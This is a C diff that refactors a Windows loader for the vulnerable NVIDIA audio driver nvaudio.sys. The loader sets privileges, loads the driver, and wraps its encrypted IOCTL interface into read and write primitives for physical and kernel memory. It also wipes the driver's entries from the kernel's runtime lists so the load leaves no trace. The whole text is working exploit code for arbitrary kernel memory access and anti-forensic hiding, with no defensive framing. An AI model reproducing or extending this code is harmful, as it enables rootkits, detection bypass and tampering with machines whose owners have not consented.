@@ -9,8 +9,21 @@
 typedef PVOID (*EncodePayLoad_t)(PVOID Request, LONG EncodeCode, ULONGLONG* EncryptionKey);
 static EncodePayLoad_t EncodePayLoad = 0;
 static PVOID NvAudioLibrary          = 0;
+extern ULONGLONG DriverResource[5517];
 
-NTSTATUS LoadDriver(_Out_ PHANDLE DeviceHandle)
+static NTSTATUS ReadSystemMemory(
+    _In_ HANDLE DeviceHandle,
+    _In_ ULONGLONG Source,
+    _Out_writes_bytes_(Length) PVOID Destination,
+    _In_ SIZE_T Length);
+
+static NTSTATUS WriteSystemMemory(
+    _In_ HANDLE DeviceHandle,
+    _In_ ULONGLONG Destination,
+    _In_reads_bytes_(Length) PVOID Source,
+    _In_ SIZE_T Length);
+
+NTSTATUS LoadDriver(_Out_ PDEVICE_DRIVER_OBJECT DriverObject)
 {
     UNICODE_STRING UnicodeString;
     NTSTATUS Status;
@@ -18,13 +31,13 @@ NTSTATUS LoadDriver(_Out_ PHANDLE DeviceHandle)
     TOKEN_PRIVILEGES Privileges;
     OBJECT_ATTRIBUTES ObjectAttributes;
     IO_STATUS_BLOCK IoStatusBlock;
-
+    HANDLE DeviceHandle;
     WCHAR DeviceName[]     = NVAUDIO_DEVICE_NAME;
     WCHAR ServiceName[]    = NVAUDIO_SERVICE_PATH;
     WCHAR DriverFullPath[] = NVAUDIO_DRIVER_PATH;
 
-    if ARGUMENT_PRESENT (DeviceHandle)
-        *DeviceHandle = NULL;
+    if ARGUMENT_PRESENT (DriverObject)
+        RtlZeroMemory(DriverObject, sizeof(DEVICE_DRIVER_OBJECT));
 
     //
     // Set Privilege.
@@ -125,6 +138,7 @@ NTSTATUS LoadDriver(_Out_ PHANDLE DeviceHandle)
             OBJ_CASE_INSENSITIVE,
             NULL,
             NULL);
+
         Status = NtOpenFile(
             DeviceHandle,
             FILE_ALL_ACCESS,
@@ -153,7 +167,10 @@ NTSTATUS LoadDriver(_Out_ PHANDLE DeviceHandle)
         Status = LdrLoadDll(NULL, NULL, &UnicodeString, &NvAudioLibrary);
 
         if NT_ERROR (Status) {
-            UnloadDriver(*DeviceHandle);
+            RtlInitUnicodeString(&UnicodeString, ServiceName);
+            NtUnloadDriver(&UnicodeString);
+            RtlRegDeleteKey(ServiceName);
+            RtlFileDelete(DriverFullPath);
 
             DEBUG_PRINT_NTERROR(Status);
             return Status;
@@ -166,28 +183,35 @@ NTSTATUS LoadDriver(_Out_ PHANDLE DeviceHandle)
     // Remove Driver RuntimeList.
     //
 
-    DEVICE_DRIVER_OBJECT Driver;
-    Driver.DeviceHandle = *DeviceHandle;
-    Driver.ReadMemory   = ReadSystemMemory;
-    Driver.WriteMemory  = WriteSystemMemory;
-    if (RemoveDriverRuntimeList(
-            &Driver,
-            L"nvaudio.sys",
-            RtlImageNtHeader(NvAudioLibrary)->FileHeader.TimeDateStamp)
-        == FALSE) {
-        LdrUnloadDll(NvAudioLibrary);
-        NvAudioLibrary = 0;
-        UnloadDriver(*DeviceHandle);
+    if NT_SUCCESS (Status) {
+        DriverObject->DeviceHandle = DeviceHandle;
+        DriverObject->ReadMemory   = ReadSystemMemory;
+        DriverObject->WriteMemory  = WriteSystemMemory;
 
-        Status = STATUS_ACCESS_DENIED;
-        DEBUG_PRINT_NTERROR(Status);
-        return Status;
+        if (RemoveDriverRuntimeList(
+                DriverObject,
+                L"nvaudio.sys",
+                RtlImageNtHeader(NvAudioLibrary)->FileHeader.TimeDateStamp)
+            == FALSE) {
+            LdrUnloadDll(NvAudioLibrary);
+            NvAudioLibrary = 0;
+
+            RtlInitUnicodeString(&UnicodeString, ServiceName);
+            NtUnloadDriver(&UnicodeString);
+            RtlRegDeleteKey(ServiceName);
+            RtlFileDelete(DriverFullPath);
+
+            Status = STATUS_ACCESS_DENIED;
+            DEBUG_PRINT_NTERROR(Status);
+            return Status;
+        }
     }
+
 
     return Status;
 }
 
-NTSTATUS UnloadDriver(_In_ HANDLE DeviceHandle)
+NTSTATUS UnloadDriver(_In_ PDEVICE_DRIVER_OBJECT DriverObject)
 {
     NTSTATUS Status;
     UNICODE_STRING UnicodeString;
@@ -199,13 +223,15 @@ NTSTATUS UnloadDriver(_In_ HANDLE DeviceHandle)
         NvAudioLibrary = 0;
     }
 
-    if (DeviceHandle) {
-        Status       = NtClose(DeviceHandle);
-        DeviceHandle = NULL;
+    if (DriverObject->DeviceHandle) {
+        Status                     = NtClose(DriverObject->DeviceHandle);
+        DriverObject->DeviceHandle = NULL;
 
         if NT_ERROR (Status) {
             DEBUG_PRINT_NTERROR(Status);
         }
+
+        RtlZeroMemory(DriverObject, sizeof(DEVICE_DRIVER_OBJECT));
     }
 
     // ==========================================================
@@ -230,7 +256,7 @@ NTSTATUS UnloadDriver(_In_ HANDLE DeviceHandle)
     return Status;
 }
 
-NTSTATUS DeviceControl(
+static NTSTATUS DeviceControl(
     _In_ HANDLE DeviceHandle,
     _In_ ULONGLONG* EncryptionKey,
     _In_ PVOID Buffer,
@@ -259,7 +285,7 @@ NTSTATUS DeviceControl(
     return Status;
 }
 
-NTSTATUS ReadPhysicalMemory(
+static NTSTATUS ReadPhysicalMemory(
     _In_ HANDLE DeviceHandle,
     _In_ ULONGLONG PhysicalAddress,
     _Out_writes_bytes_(BufferLength) PVOID Buffer,
@@ -274,7 +300,7 @@ NTSTATUS ReadPhysicalMemory(
     return DeviceControl(DeviceHandle, Request.EncryptionKey, &Request, sizeof(NVAUDIO_REQUEST));
 }
 
-NTSTATUS WritePhysicalMemory(
+static NTSTATUS WritePhysicalMemory(
     _In_ HANDLE DeviceHandle,
     _In_ ULONGLONG PhysicalAddress,
     _In_reads_bytes_(BufferLength) PVOID Buffer,
@@ -289,7 +315,7 @@ NTSTATUS WritePhysicalMemory(
     return DeviceControl(DeviceHandle, Request.EncryptionKey, &Request, sizeof(NVAUDIO_REQUEST));
 }
 
-NTSTATUS GetPhysicalAddress(
+static NTSTATUS GetPhysicalAddress(
     _In_ HANDLE DeviceHandle,
     _In_ ULONGLONG VirtualAddress,
     _Out_ PULONGLONG PhysicalAddress)
@@ -308,7 +334,7 @@ NTSTATUS GetPhysicalAddress(
     return Status;
 }
 
-NTSTATUS ReadSystemMemory(
+static NTSTATUS ReadSystemMemory(
     _In_ HANDLE DeviceHandle,
     _In_ ULONGLONG Source,
     _Out_writes_bytes_(Length) PVOID Destination,
@@ -326,7 +352,7 @@ NTSTATUS ReadSystemMemory(
     return ReadPhysicalMemory(DeviceHandle, PhysicalAddress, Destination, Length);
 }
 
-NTSTATUS WriteSystemMemory(
+static NTSTATUS WriteSystemMemory(
     _In_ HANDLE DeviceHandle,
     _In_ ULONGLONG Destination,
     _In_reads_bytes_(Length) PVOID Source,
